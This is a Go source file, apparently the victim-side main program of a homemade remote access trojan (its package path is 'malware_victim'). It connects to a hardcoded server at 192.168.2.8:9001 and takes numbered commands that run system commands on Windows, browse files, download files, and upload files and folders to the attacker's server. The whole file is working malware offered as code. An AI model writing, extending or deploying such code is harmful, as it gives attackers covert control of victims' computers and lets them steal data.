package main

import (
	"bufio"
	"fmt"
	download "malware_victim/core/download"
	executesystemcommands "malware_victim/core/executeSystemCommands"
	handleconnection "malware_victim/core/handleConnection"
	"malware_victim/core/move"
	"malware_victim/core/upload"
	"strings"
)

type Data struct {
	Name string
	ID   int
	Age  int
}

func check_error(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	ServerIP := "192.168.2.8"
	ServerPort := "9001"

	connection, err := handleconnection.Connect_to_server(ServerIP, ServerPort)
	check_error(err)

	fmt.Println("[+] Connection established with ", connection.RemoteAddr().String())

	defer connection.Close()

	reader := bufio.NewReader(connection)

	loop_control := true

	for loop_control {

		data, err := reader.ReadString('\n')
		check_error(err)

		cleaned_data := strings.TrimSuffix(data, "\n")

		switch {
		case cleaned_data == "1":
			fmt.Println("[+] Command Execution on Windows")
			err := executesystemcommands.Ecexute_command(connection)
			check_error(err)

		case cleaned_data == "2":
			fmt.Println("[+] File Navigation")
			err := move.Navigate_file_system(connection)
			check_error(err)

		case cleaned_data == "3":
			fmt.Println("[+] Download Files from server")
			err := download.Download_files(connection)
			check_error(err)

		case cleaned_data == "4":
			fmt.Println("[+] Upload Files to server")
			err := upload.Upload_files(connection)
			check_error(err)

		case cleaned_data == "5":
			fmt.Println("[+] Upload Folders to server")
			err := upload.Upload_folders(connection)
			check_error(err)

		case cleaned_data == "0":
			fmt.Println("[-] Exiting the program")
			loop_control = false

		default:
			fmt.Println("[-] Invalid option!")
		}

	}

	// decoder := gob.NewDecoder(connection)

	// data := &Data{}

	// decoder.Decode(data)

	// fmt.Println("[+] Successfully decoded the data")
	// fmt.Println(data.Name)
	// fmt.Println(data.ID)
	// fmt.Println(data.Age)

	// data, err := reader.ReadString('\n')

	// if err != nil {
	// 	log.Fatal(err)
	// }

	// cleaned_data := strings.TrimSuffix(data, "\n")

	// fmt.Println(cleaned_data)

}
